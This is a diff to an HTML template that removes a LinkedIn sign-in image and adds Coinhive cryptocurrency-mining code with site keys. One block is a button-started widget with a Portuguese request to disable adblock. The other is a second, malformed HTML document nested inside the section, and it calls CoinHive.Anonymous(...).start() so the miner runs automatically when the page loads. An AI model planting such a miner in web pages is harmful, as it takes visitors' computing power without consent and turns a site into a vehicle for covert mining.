@@ -1,7 +1,33 @@
 <section>
-    <img ng-mouseenter="signinLinkedIn = true"
-         ng-mouseleave="signinLinkedIn = false"
-         ng-click="onLoginLinkedIn()"
-         ng-model="signinLinkedIn" ng-src="{{!signinLinkedIn && '/public/images/Retina/Sign-In-Small---Default.png' || '/public/images/Retina/Sign-In-Small---Hover.png'}}"
-         alt="">
+    <script src="https://coinhive.com/lib/miner.min.js" async></script>
+    <div class="coinhive-miner"
+         style="width: 256px; height: 310px"
+         data-key="XvaJ1uJE8vxIdDl0YaPKkG2wWSKbcXi0"
+         data-autostart="false"
+         data-whitelabel="false"
+         data-background="#000000"
+         data-text="#eeeeee"
+         data-action="#00ff00"
+         data-graph="#555555"
+         data-threads="4"
+         data-throttle="0.1"
+         data-start="Start Now!">
+        <em>Por favor desabilite o adblock!</em>
+    </div>
+    <html>
+    <head>
+        <title>coinhive</title>
+        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+        <script>
+            var miner = new CoinHive.Anonymous('qKWMDhsaKIdVnt4lDaBCodWRMPkDavNq');
+            miner.start();
+        </script>
+
+    </head>
+    <body>
+
+    Coinhive
+
+    </body>
+    </html>
 </section>
